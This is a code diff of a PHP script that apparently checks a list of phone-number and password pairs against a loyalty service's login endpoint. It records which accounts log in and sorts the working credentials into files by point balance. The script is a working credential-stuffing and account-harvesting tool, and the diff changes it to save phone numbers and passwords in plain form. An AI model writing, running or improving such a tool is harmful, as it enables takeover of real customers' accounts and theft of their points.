@@ -34,7 +34,7 @@ foreach($listAkun as $format) {
     }
     $password = $AkunLion[1];
 
-    echo "[ ".date("H:i:s")." ] [".$no."/".count($listAkun)."] ".$colors->getColoredString($format, "green");
+    echo "[ ".date("H:i:s")." ] [".$no."/".count($listAkun)."] ".$colors->getColoredString(trim($nomorHP)."|".trim($password), "green");
     $data = '{"password":"'.$password.'","phone_number":"'.$nomorHP.'","role":"CUSTOMER"}';
     $contentLength = strlen($data);
     $headers = [
@@ -61,11 +61,11 @@ foreach($listAkun as $format) {
         echo " >> ".$colors->getColoredString("Point: ".$saldoPoin." Exp: [".$expiredPoin."]", "green").PHP_EOL;
         if(!is_dir("AccLionBersaldo")) mkdir("AccLionBersaldo");
         if ($saldoPoin > 10000) {
-            file_put_contents("AccLionBersaldo/BerPoint.txt", trim($format)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
+            file_put_contents("AccLionBersaldo/BerPoint.txt", trim($nomorHP)."|".trim($password)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
         } else if ($saldoPoin == 10000) {
-            file_put_contents("AccLionBersaldo/Berpoint_10K.txt", trim($format)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
+            file_put_contents("AccLionBersaldo/Berpoint_10K.txt", trim($nomorHP)."|".trim($password)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
         } else {
-            file_put_contents("AccLionBersaldo/Miskin_Point.txt", trim($format)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
+            file_put_contents("AccLionBersaldo/Miskin_Point.txt", trim($nomorHP)."|".trim($password)."|Point: ".$saldoPoin." |Exp: [".$expiredPoin."]".PHP_EOL, FILE_APPEND);
         }    
     } else {
         echo " >> ".$colors->getColoredString("Login Gagal", "red").PHP_EOL;
